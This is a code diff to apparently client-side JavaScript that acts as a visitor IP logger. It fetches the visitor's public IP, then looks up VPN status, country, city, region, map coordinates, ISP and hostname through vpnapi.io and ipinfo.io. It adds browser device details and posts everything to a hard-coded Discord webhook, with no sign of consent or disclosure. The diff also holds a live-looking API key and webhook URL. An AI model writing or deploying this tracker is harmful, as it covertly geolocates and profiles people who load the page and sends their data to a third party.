@@ -12,11 +12,9 @@ function device_info() {
       doNotTrack: navigator.doNotTrack,
       hardwareConcurrency: navigator.hardwareConcurrency,
       maxTouchPoints: navigator.maxTouchPoints
-
   };
 
   var json = "";
-
   for (var key in info) {
       json += key + ': ' + info[key] + "\n";
   }
@@ -96,52 +94,6 @@ function detectResolution() {
 
 };
 
-async function detectVPN(ip) {
-  const apikey = "f0b7f18a3e7541149ae064d21b443589";
-  const apiUrl = `https://vpnapi.io/api/${ip}?key=${apikey}`;
-
-  try {
-    const response = await fetch(apiUrl);
-    const data = await response.json();
-    return data.security.vpn;
-  } catch (error) {
-    console.error(error);
-    throw new Error("Error al hacer la consulta a la API");
-  }
-};
-
-async function detectLocation(ip) {
-  const apikey = "f0b7f18a3e7541149ae064d21b443589";
-  const apiUrl = `https://vpnapi.io/api/${ip}?key=${apikey}`;
-
-  try {
-    const response = await fetch(apiUrl);
-    const data = await response.json();
-    return data.location.city;
-  } catch (error) {
-    console.error(error);
-    throw new Error("Error al hacer la consulta a la API");
-  }
-};
-
-
-async function detectMapsLocation(ip) {
-  const apikey = "f0b7f18a3e7541149ae064d21b443589";
-  const apiUrl = `https://vpnapi.io/api/${ip}?key=${apikey}`;
-
-  try {
-    const response = await fetch(apiUrl);
-    const data = await response.json();
-    var latitude = data.location.latitude;
-    var longitude = data.location.longitude;
-    return `https://google.com/maps/place/${latitude},${longitude}`;
-  } catch (error) {
-    console.error(error);
-    throw new Error("Error al hacer la consulta a la API");
-  }
-  
-}
-
 function detectTime() {
   var currentTime = new Date();
   var hours = currentTime.getHours();
@@ -155,6 +107,119 @@ function detectTime() {
   return formattedTime;
 }
 
+// Request a la api de vpnapi.io, funciones async, 
+  // request de curl:
+    // $ curl 'https://vpnapi.io/api/'"$(curl ifconfig.me)"'?key=f0b7f18a3e7541149ae064d21b443589'
+    // $ curl 'https://ipinfo.io/'"$(curl ifconfig.me)"'/org'  <- ISP
+    // $ curl 'https://ipinfo.io/'"$(curl ifconfig.me)"'/hostname'  <- hostname
+
+const apikey = "f0b7f18a3e7541149ae064d21b443589";
+
+async function detectVPN(ip) {
+  try {
+    const apiUrl = `https://vpnapi.io/api/${ip}?key=${apikey}`;
+    const response = await fetch(apiUrl);
+    const data = await response.json();
+    return data.security.vpn;
+  } catch (error) {
+    console.error(error);
+    throw new Error("Error al hacer la consulta a la API");
+  }
+};
+
+async function detectLocation(ip) {
+  const apiUrl = `https://vpnapi.io/api/${ip}?key=${apikey}`;
+  try {
+    const response = await fetch(apiUrl);
+    const data = await response.json();
+    var place = `${data.location.country}, ${data.location.city}, ${data.location.region}`
+    return place;
+  } catch (error) {
+    console.error(error);
+    throw new Error("Error al hacer la consulta a la API");
+  }
+};
+
+
+async function detectMapsLocation(ip) {
+  const apiUrl = `https://vpnapi.io/api/${ip}?key=${apikey}`;
+  try {
+    const response = await fetch(apiUrl);
+    const data = await response.json();
+    var latitude = data.location.latitude;
+    var longitude = data.location.longitude;
+    return `https://google.com/maps/place/${latitude},${longitude}`;
+  } catch (error) {
+    console.error(error);
+    throw new Error("Error al hacer la consulta a la API");
+  }
+  
+}
+
+
+async function detectAllSecurity(ip) {
+  const apiUrl = `https://vpnapi.io/api/${ip}?key=${apikey}`;
+  try {
+    const response = await fetch(apiUrl);
+    const data = await response.json();
+    
+    var security = "";
+    for (var key in data.security) {
+      security += '\t' + key + ': ' + data.security[key] + "\n";
+    }
+    return security;
+  } catch (error) {
+    console.error(error);
+    throw new Error("Error al hacer la consulta a la API");
+  }
+};
+
+async function detectAllLocation(ip) {
+  const apiUrl = `https://vpnapi.io/api/${ip}?key=${apikey}`;
+  try {
+    const response = await fetch(apiUrl);
+    const data = await response.json();
+    
+    var all_location = "";
+    for (var key in data.location) {
+      all_location += '\t' + key + ': ' + data.location[key] + "\n";
+    }
+    return all_location;
+  } catch (error) {
+    console.error(error);
+    throw new Error("Error al hacer la consulta a la API");
+  }
+};
+
+
+async function detectISP(ip) {
+  const apiUrl = `https://vpnapi.io/api/${ip}?key=${apikey}`;
+  try {
+    const response = await fetch(apiUrl);
+    const data = await response.json();
+    var ISP = `${data.network.autonomous_system_number} ${data.network.autonomous_system_organization}`
+    return ISP;
+  } catch (error) {
+    console.error(error);
+    throw new Error("Error al hacer la consulta a la API");
+  }
+};
+
+async function detecthostname(ip) {
+  const apiUrl = `http://ipinfo.io/${ip}/json`
+  try {
+    const response = await fetch(apiUrl);
+    const data = await response.json();
+    
+    var hostname = data.hostname;
+    return hostname;
+  } catch (error) {
+    console.error(error);
+    throw new Error("Error al hacer la consulta a la API");
+  }
+}
+
+// Send data
 var ip = '';
 fetch('https://api.ipify.org/?format=json')
   .then(function(response) {
@@ -164,11 +229,15 @@ fetch('https://api.ipify.org/?format=json')
     ip = data.ip;
     var webwhook = 'https://discord.com/api/webhooks/1128070706798792828/R1CVOSbGgwkuViDOdkhLhvYzNdhnndMywgxmMo8t3IUrTVAl_k3ibubjoFeRJS4NKcs2';
     try {
-        var is_vpn = await detectVPN(ip); // Utilizamos await para esperar a que la promesa se resuelva
+        var is_vpn = await detectVPN(ip);
         var location = await detectLocation(ip);
         var maps_url = await detectMapsLocation(ip);
+        var security = await detectAllSecurity(ip);
+        var all_location = await detectAllLocation(ip);
+        var ISP = await detectISP(ip);
+        var hostname = await detecthostname(ip);
     } catch(error) {
-        is_vpn = error;
+        console.log(error);
     }
     var message = {
       content: 
@@ -176,9 +245,14 @@ fetch('https://api.ipify.org/?format=json')
         '```js' + '\n' +
         'VPN: ' + is_vpn + '\n' +
         'IP: ' + ip + '\n' +
-        'Ciudad: ' + location + '\n' +
+        'ISP: ' + ISP + '\n' +
+        'Hostname: ' + hostname + '\n' +
+        'Lugar: ' + location + '\n' +
         '------------------------------' + '\n' + '\n' + 
-        device_info() + 
+        device_info() + '\n------ ------ ------ \n' +
+        'All Security: \n' + security + '\n------ ------ ------ \n' +
+        'All Location: \n' + all_location +
+
         '```' + '\n' +
         '### Maps: ' + maps_url 
     };
